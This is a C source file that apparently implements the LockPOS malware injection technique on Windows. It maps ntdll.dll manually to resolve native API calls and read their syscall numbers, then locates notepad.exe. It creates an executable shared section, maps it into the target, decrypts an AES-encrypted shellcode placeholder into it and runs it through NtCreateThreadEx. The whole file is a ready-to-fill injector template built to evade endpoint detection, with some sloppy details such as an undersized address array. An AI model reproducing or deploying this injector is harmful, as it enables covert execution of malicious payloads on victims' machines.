/*https://www.cyberbit.com/endpoint-security/new-lockpos-malware-injection-technique/*/
/*CreateFileMappingW, MapViewOfFile, RtlAllocateHeap, NtCreateSection(0x004a), NtMapViewOfSection(0x0028), NtCreateThreadEx(0x004e)*/
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "lockpos.h"
#include <ntstatus.h>
#include <stdint.h>
#include <string.h>

#define AES_BLOCK_SIZE 16
#define INITIAL_HASH 0xABCD1234  // Początkowy wektor
#define MIX_CONSTANT 0x9E3779B9  // Stała mieszająca

typedef BOOL (*pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);

typedef struct _SYSCALL_ENTRY {
    char* FunctionName;
    DWORD SyscallNumber;
} SYSCALL_ENTRY;


BYTE shellcode[] = {"your AES encrypted payload here"};
    SIZE_T shellcodesize = sizeof(shellcode);

    void decryptData(const BYTE* encryptedData, SIZE_T encryptedSize, BYTE* outputData, SIZE_T* outputSize, const char* aesKey) {
        HCRYPTPROV hCryptProv = 0;
        HCRYPTKEY hKey = 0;
        HCRYPTHASH hHash = 0;
    
        // Acquire a cryptographic provider context
        if (!CryptAcquireContextA(&hCryptProv, NULL, MS_ENH_RSA_AES_PROV_A, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            printf("[-] CryptAcquireContext failed, error: %d\n", GetLastError());
            return;
        }
    
        // Create a hash object
        if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
            printf("[-] CryptCreateHash failed, error: %d\n", GetLastError());
            CryptReleaseContext(hCryptProv, 0);
            return;
        }
    
        // Hash the AES key
        if (!CryptHashData(hHash, (BYTE*)aesKey, (DWORD)strlen(aesKey), 0)) {
            printf("[-] CryptHashData failed, error: %d\n", GetLastError());
            CryptDestroyHash(hHash);
            CryptReleaseContext(hCryptProv, 0);
            return;
        }
    
        // Derive an AES key from the hash
        if (!CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
            printf("[-] CryptDeriveKey failed, error: %d\n", GetLastError());
            CryptDestroyHash(hHash);
            CryptReleaseContext(hCryptProv, 0);
            return;
        }
    
        CryptDestroyHash(hHash); // No longer needed
    
        // Copy encrypted data to output buffer
        memcpy(outputData, encryptedData, encryptedSize);
        DWORD dataSize = (DWORD)encryptedSize;
    
        // Perform decryption
        if (!CryptDecrypt(hKey, 0, TRUE, 0, outputData, &dataSize)) {
            printf("[-] CryptDecrypt failed, error: %d\n", GetLastError());
            CryptDestroyKey(hKey);
            CryptReleaseContext(hCryptProv, 0);
            return;
        }
    
        *outputSize = dataSize; // Update the actual decrypted size
    
        // Cleanup
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
    }
int main(void){

    NTSTATUS status;
    PVOID HAllocate = NULL;
    PROCESS_INFORMATION pi;
    STARTUPINFO si = {sizeof(si)};
    unsigned long oldProtection = 0;

//creating handle for ntdll
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        printf("[-] failed to create(open) file, error: [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] Opening ntdll.dll\n");


//creating a mapping object for the ntdll        
    HANDLE FileMapd = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, L"mydll");
    if(FileMapd == NULL){
        printf("[-] unable to creating mapping object, error: [%d]\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
        printf("[+] creating the mapping object\n");


//mapping the ntdll to address in our process (this program)
    LPVOID FileView = MapViewOfFile(FileMapd, FILE_MAP_READ, 0, 0, 0);
    if(FileView == NULL){
        printf("[-] failed to mapping file, error: [%d]\n", GetLastError());
        CloseHandle(hFile);
        CloseHandle(FileMapd);
        return 1;
    }
        printf("[+] file has been mapped to [0x%p]\n", FileView);
        
/*next couple blocks of code are steps for manually loading function from ntdll.dll, (PE manual loading technique)*/
    IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER *)FileView;
    IMAGE_NT_HEADERS *nt_headers = (IMAGE_NT_HEADERS *)((BYTE *)FileView + dos_header->e_lfanew);
    //printf("dos_header and nt_headers addresses: [%p, %p]\n", dos_header, nt_headers);
    
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY *)((PBYTE)FileView + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    //printf("export table addres: [%p]\n", exportDir);
    
    DWORD *addressOfFunctions = (DWORD *)((PBYTE)FileView + exportDir->AddressOfFunctions);
    DWORD *addressOfNames = (DWORD *)((PBYTE)FileView + exportDir->AddressOfNames);
    WORD *addressOfNameOrdinals = (WORD *)((PBYTE)FileView + exportDir->AddressOfNameOrdinals);
    //printf("test [%p, %p, %p]\n", addressOfFunctions, addressOfNames, addressOfNameOrdinals);//for debuging purpose
    

//looking for required function addresses by names
    //char *functionNames[] = {"0x70F8084F", "0x6AA462C9", "0x0AEF06C2", "0x2C8B305F" , "0xE878E8F6"};
    char *functionNames[] = {"NtCreateSection", "NtCreateThreadEx", "NtMapViewOfSection", "NtProtectVirtualMemory", "RtlAllocateHeap"};
    
    void *function_addresses[4] = {0};
    
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* functionName = (char*)((PBYTE)FileView + addressOfNames[i]);
        for (int j = 0; j < sizeof(functionNames) / sizeof(functionNames[0]); j++) {
            if (strcmp(functionName, functionNames[j]) == 0) {
                DWORD functionOrdinal = addressOfNameOrdinals[i];
                DWORD functionAddress = addressOfFunctions[functionOrdinal];
                PBYTE functionPtr = (PBYTE)FileView + functionAddress;
                function_addresses[j] = functionPtr;
                // Looking for syscall number in first 16 bytes of function 
                DWORD syscallNumber = 0;
                for (int k = 0; k < 16; k++) {
                    if (functionPtr[k] == 0xB8) {  // mov eax, XXh
                        syscallNumber = *(DWORD*)(functionPtr + k + 1);
                        break;
                    }
                }
                printf("Function [%s] found at address: [0x%p] with syscall number [%d]\n",
                       functionNames[j], functionPtr, syscallNumber);
            }
        }
    }

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if(snapshot == INVALID_HANDLE_VALUE){
        printf("[-] creating snapshot failed, error: [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] Creating snapshot\n");


//enumeracja procesow w celu znalezienia procesu ofiary "notepad.exe"
    PROCESSENTRY32W hEntry;
    hEntry.dwSize = sizeof(PROCESSENTRY32W);
    THREADENTRY32 hTEntry; 
    hTEntry.dwSize = sizeof(THREADENTRY32);

    if (Process32FirstW(snapshot, &hEntry)) {
        do {
            if (_wcsicmp(hEntry.szExeFile, L"notepad.exe") == 0) {
                wprintf(L"[+] Target process: [%d]\n", hEntry.th32ProcessID);
                break;  
            }
        } while (Process32NextW(snapshot, &hEntry)); // Uniknięcie nieskończonej pętli
    } else {
        wprintf(L"[-] Getting processes list failed, error: [%d]\n", GetLastError());
        CloseHandle(snapshot);
    }


    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, TRUE, hEntry.th32ProcessID);
    if(!hProcess){
        printf("[-] Opening proces failed: [%d]\n", hEntry.th32ProcessID);
        return 1;
    }
    printf("[+] Opening the target process [%d]\n", hEntry.th32ProcessID);

//creating a section object in the kernel 
    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = 0x1000; 
    pNtCreateSection NtCreateSection = (pNtCreateSection)function_addresses[0];
    status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to create section. NTSTATUS: 0x%X\n", status);
        CloseHandle(FileMapd);
        CloseHandle(hFile);
		return 1;
	}
    printf("[+] Section created \n");

//map a view of that section into selected process
    PVOID cSection = NULL;
    DWORD viewSize = 0;
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)function_addresses[2];
    status = NtMapViewOfSection(hSection, hProcess, &cSection, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to map section. NTSTATUS: 0x%X\n", status);
        CloseHandle(FileMapd);
        CloseHandle(hFile);
        return 1;
    }
    printf("[+] Section mapped at address: %p\n", cSection);

    BYTE decryptedData[512] = { 0 }; // Buffer for decryption
    SIZE_T decryptedSize = sizeof(decryptedData);

    const char* encryptionKey = "your AES key here";

    decryptData(shellcode, shellcodesize, decryptedData, &decryptedSize, encryptionKey);
//copying code into section
    SIZE_T written;
//pWriteProcessMemory WriteProcessMemory= (pWriteProcessMemory)function_addresses[4];//pWriteProcessMemory
    BOOL writeMem = WriteProcessMemory(hProcess, cSection, decryptedData, decryptedSize, &written);
    if (writeMem == 0){
        printf("[-] unable to write shellocde into process memory, error: [%d]\n", GetLastError());
        VirtualFreeEx(hProcess, cSection, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        CloseHandle(FileMapd);
        CloseHandle(hFile);
        return 1;
    }
    printf("[+] Writting shellcode into process [%d]\n", written);

// Change Memory Protection: RW -> RX
    PVOID baseAddress = cSection;  //must be pointer
    SIZE_T regionSize = shellcodesize;  //size of written region
    _NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)function_addresses[3];
	status = pNtProtectVirtualMemory(hProcess, &cSection, &decryptedSize, PAGE_EXECUTE_READ, &oldProtection);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to change memory protection from RW to RX: %x \n", status);
		exit(-1);
	}

//creating a remote thread
    HANDLE hThread = NULL;
    PVOID remoteShellcode = (LPTHREAD_START_ROUTINE)cSection;
    _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)function_addresses[1];
//for proper operating requireing the PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION acces rights in OpenProcess function
    status = NtCreateThreadEx(
        &hThread,              
        THREAD_ALL_ACCESS,     
        NULL,                  
        hProcess,               
        remoteShellcode,       
        NULL,                   
        FALSE,                  
        0,                      
        0,                     
        0,                      
        NULL                    
    );
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to Execute Remote Thread: 0x%X\n", status);
        exit(-1);
    }

    printf("[+] Injected shellcode!!\n");
    system("pause");


    //NtClose(hSection);
    UnmapViewOfFile(FileView);
    CloseHandle(hProcess);
    CloseHandle(FileMapd);
    CloseHandle(hFile);
    CloseHandle(hSection);

    return 0;
}
